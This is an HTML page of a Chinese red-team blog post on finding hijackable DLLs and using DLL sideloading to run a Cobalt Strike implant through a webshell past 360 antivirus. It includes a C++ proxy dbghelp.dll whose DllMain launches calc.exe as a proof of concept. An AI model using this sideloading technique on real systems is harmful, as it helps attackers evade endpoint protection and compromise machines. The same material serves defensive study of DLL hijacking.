@@ -1,0 +1,704 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="WY3507">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言随着现在防护产品的升级和大规模的普及，现在想要突破AV和EDR的防护来达到免杀上线及后续的高危操作大家跟加会去利用白加黑的方法来实现目的，而且市面上很多APT组织都会利用这种方式来入侵，为撒都会青睐这种方式呢，无非就是简单高效并且节约成本。接下来我会讲一下怎么去挖DLL的方法和利用。至于DLL劫持的原理我就不过多介绍了，相信社区的大佬们都了解。 DLL挖掘在挖掘dll时都会用到一个工具叫pro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DLL挖掘及突破360核晶利用">
+<meta property="og:url" content="http://example.com/2024/02/26/DLL%E6%8C%96%E6%8E%98%E5%8F%8A%E7%AA%81%E7%A0%B4360%E6%A0%B8%E6%99%B6%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="WY3507&amp;Blog">
+<meta property="og:description" content="前言随着现在防护产品的升级和大规模的普及，现在想要突破AV和EDR的防护来达到免杀上线及后续的高危操作大家跟加会去利用白加黑的方法来实现目的，而且市面上很多APT组织都会利用这种方式来入侵，为撒都会青睐这种方式呢，无非就是简单高效并且节约成本。接下来我会讲一下怎么去挖DLL的方法和利用。至于DLL劫持的原理我就不过多介绍了，相信社区的大佬们都了解。 DLL挖掘在挖掘dll时都会用到一个工具叫pro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps9.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps10.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps11.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps12.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps13.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps14.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps15.jpg">
+<meta property="article:published_time" content="2024-02-26T07:44:38.000Z">
+<meta property="article:modified_time" content="2024-02-26T07:52:20.207Z">
+<meta property="article:author" content="WY3507">
+<meta property="article:tag" content="DLL挖掘">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps1.jpg">
+  
+  
+  
+  <title>DLL挖掘及突破360核晶利用 - WY3507&amp;Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>WY3507&amp;Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DLL挖掘及突破360核晶利用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-26 15:44" pubdate>
+          2024年2月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DLL挖掘及突破360核晶利用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着现在防护产品的升级和大规模的普及，现在想要突破AV和EDR的防护来达到免杀上线及后续的高危操作大家跟加会去利用白加黑的方法来实现目的，而且市面上很多APT组织都会利用这种方式来入侵，为撒都会青睐这种方式呢，无非就是简单高效并且节约成本。接下来我会讲一下怎么去挖DLL的方法和利用。至于DLL劫持的原理我就不过多介绍了，相信社区的大佬们都了解。</p>
+<h2 id="DLL挖掘"><a href="#DLL挖掘" class="headerlink" title="DLL挖掘"></a>DLL挖掘</h2><p>在挖掘dll时都会用到一个工具叫process monitor这个工具，这个工具可以让我们快速的去寻找能被劫持的dll，该工具可以让我们去查询软件下运行的dll，但是我们为了加快寻找速度我们可以做一些搜索限制来让我们更快的去寻找能劫持的dll，下图的红框就是我们要做的搜索限制</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps1.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>这里我们找个厂商来做一次测试</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps2.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>发现了能被劫持的dll，这里我们测试的dll 为 dbghelp.dll</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps3.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>但是我们去查看这个dll时发现它不存在 LoadLibraryExW 和 LoadLibraryw 函数则是无法被直接利用的，要是直接利用的话是会提示报错，这里是因为导入表和导出表的问题，我们需要将这个dll需要的函数导入进去才能利用</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps4.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>提示报错</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps5.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>接下来我们可以将需要的函数写进去就行，这里我们通过VS的dumpbin.exe去查看dbghelp.dll所需要的函数并编写POC</p>
+<p>dumpbin.exe &#x2F;imports .\bugreport64.exe</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps6.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span> </span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">StackWalk</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymFunctionTableAccess</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymCleanup</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymSetOptions</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymGetModuleInfoW</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymLoadModule</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymInitialize</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SymGetModuleInfo</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125; <br>STARTUPINFO si = &#123;<span class="hljs-number">0</span>&#125;; <br>PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>&#125;; <br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule, </span></span><br><span class="hljs-params"><span class="hljs-function">DWORD ul_reason_for_call, </span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpReserved </span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">switch</span> (ul_reason_for_call) <br>&#123; <br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH: <br><span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-comment">// No module name (use command line) </span><br>(LPSTR)<span class="hljs-string">&quot;calc.exe&quot;</span>, <span class="hljs-comment">// Command line </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Process handle not inheritable </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Thread handle not inheritable </span><br>FALSE, <span class="hljs-comment">// Set handle inheritance to FALSE </span><br><span class="hljs-number">0</span>, <span class="hljs-comment">// No creation flags </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Use parent&#x27;s environment block </span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// Use parent&#x27;s starting directory </span><br>(LPSTARTUPINFOA)&amp;si, <span class="hljs-comment">// Pointer to STARTUPINFO structure </span><br>(LPPROCESS_INFORMATION)&amp;pi <span class="hljs-comment">// Pointer to </span><br>PROCESS_INFORMATION structure <br>); <br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH: <br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH: <br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH: <br><span class="hljs-keyword">break</span>; <br>&#125; <br><span class="hljs-keyword">return</span> TRUE; <br>&#125; <br></code></pre></td></tr></table></figure>
+
+
+
+<p>测试发现成功弹出计算器，说明这个dll是可以被我们利用的，那么我们是不是就可以利用白加黑来达到我们的一下目的呢比如免杀线上等其他操作了呢！</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps7.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>但是我们可以发现该dll 是windows自带的dll，我们可以去利用everything去查看一下</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps8.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>但是像这些dll都会被360给标记我们可以去测试一下来个静态查杀，至于为撒会被查杀是可能360觉得你单独将这些dll放出来就会存在一些嫌疑，个人觉得哈。</p>
+<p>测试发现你去查杀就会报毒的。</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps9.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>所以建议大家在挖掘dll时最好去挖一些厂商自带的dll，不是去调用windows本身的dll，这里我们测试一下，去换一个厂自带的dll去测试发现就不会报毒，测试的这个dll就不是windows自带的dll，所以360就不会去查杀它，那这样是不是对我们做免杀会更加隐秘呢？</p>
+<p>当然windows自带的dll也是能利用的，可能会增加一些风险。</p>
+<p>类似这种劫持非常多，包括很多软件不是微软的dll，他们的自己的dll很多存在这些问题。 </p>
+<p>一些公开的：<a target="_blank" rel="noopener" href="https://hijacklibs.net/">https://hijacklibs.net/</a></p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps10.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>这里对挖dll做个总结，我们最好是挖一些厂商自带的dll会更好一些，其挖掘方法也是和上面的思路是一样的，当然我写的方法较为简单，这里推荐大家一些文章吧</p>
+<p><a target="_blank" rel="noopener" href="https://www.ijiandao.com/2b/baijia/418614.html">https://www.ijiandao.com/2b/baijia/418614.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.seoxiehui.cn/article-353755-1.html">https://www.seoxiehui.cn/article-353755-1.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://tttang.com/archive/1365/">http://tttang.com/archive/1365/</a></p>
+<h2 id="白加黑利用场景"><a href="#白加黑利用场景" class="headerlink" title="白加黑利用场景"></a>白加黑利用场景</h2><p>在挖掘完能被劫持利用的dll后我们就可以利用白加黑的方式来上线我们的木马了，这里我讲了一个白加黑的利用场景，也是挺受用的。</p>
+<p>就是我们在拿到一个webshell时都希望我们能上线到我们的CS上去，但是假如我们的目标存在360并且开了核晶时我们该怎么办上线我们的木马呢？</p>
+<p>有人会说通过webshell上传一个exe，去用蚁剑等工具直接去运行它不就可以上线了嘛！那真的可行嘛？毕竟这不是靶场，我们一个start x.exe 就成功上线了啊？而且我们的环境还是360加核晶的，我们也不妨来试试看能不能行嘛</p>
+<p>这里上传了一个5.exe的马并且是做了免杀的哦，我们在桌面上去点击是可以上线的，但是问题就出来了，我们能登到目标的桌面上嘛？我们现在就一个webshell，只能通过这个webshell来上线了！</p>
+<p>这时我们测试发现直接运行5.exe 目标机会被360拦的，可能我们还在想是不是我们的马有问题还是wenshell管理工具有问题，其实都不是，就是我们的马被360给拦了！</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps11.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps12.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>那接下来来我们该怎么办呢，这里我们就可以利用我们的白加黑来操作了，我们把我们的马放进去利用白文件加载黑dll来上线，再通过蚁剑来运行一下试试呢？</p>
+<p> 发现通过这个方法就可以绕过360+核晶来成功上线我们的CS了</p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps13.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps14.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps15.jpg" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.这里我们简单讲解了一下dll挖掘的方法，以及推荐大家去挖掘厂商自带的存在问题的dll会更好一些</p>
+<p>2.在真实环境中我们会遇到很多问题，并不会像靶场一样那么简单就能上线的，这里我也讲述了一个绕过360+核晶的上线方法，就是利用我们常见的白加黑方式，这个方式会360来说非常有效，所以说白加黑还是挺有用的，当然知道社区大佬多，可能早都知道了这个方法，哈哈 应该还是有需要的兄弟吧</p>
+<p>3.当然绕过360上线不止这一个方法了，什么利用powershell来上线360+核晶的方法也是可以的，但是也是需要绕过的，大佬们可以研究一下</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/" class="category-chain-item">红队攻防</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/DLL%E6%8C%96%E6%8E%98/" class="print-no-link">#DLL挖掘</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DLL挖掘及突破360核晶利用</div>
+      <div>http://example.com/2024/02/26/DLL挖掘及突破360核晶利用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>WY3507</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/23/WSDL%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="WSDL渗透测试">
+                        <span class="hidden-mobile">WSDL渗透测试</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
